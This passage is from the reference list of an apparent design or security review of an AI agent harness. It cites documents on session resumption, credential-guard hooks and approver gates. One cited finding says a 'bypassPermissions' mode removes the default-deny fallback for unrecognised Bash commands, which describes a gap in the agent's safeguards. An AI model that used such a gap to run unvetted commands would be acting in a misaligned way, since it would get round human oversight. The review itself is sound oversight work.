  in-code (spawn.py:2231-2245, harness/driver.py:257-270) establishing that a headless `-p`
  process cannot be revived in-process after `end_turn`, only re-invoked via `--resume` — the
  basis for why a resume path exists at all. Not independently re-fetched this review; cited as the
  in-code comment already attributes it.
- docs/issue-886/reports/implementation/hunt-issue-886-permission-mode-fix.md — in-repo canon
  establishing the empirical claim finding #1 rests on (bypassPermissions removes the fallback
  default-deny for allow-hook-unrecognized Bash shapes). Cited by path per the proposal's stated
  boundary; not independently re-read/re-executed in this review (see finding #1's `unverifiable:`
  line).
- docs/issue-858/proposals/credential-record-guard.md — in-repo canon establishing
  `credential-record-guard.sh`'s original design intent and scope boundary (issue #858, `docs/**`
  writes only) — the Posture re-evaluation's recommended extension builds on this design rather
  than replacing it.
- docs/specs/approvers.md — external-to-this-record canon establishing the accepted approver list
  and the contract v3 §19 Approve-gate mechanism this record's residual-risk-notes reference.
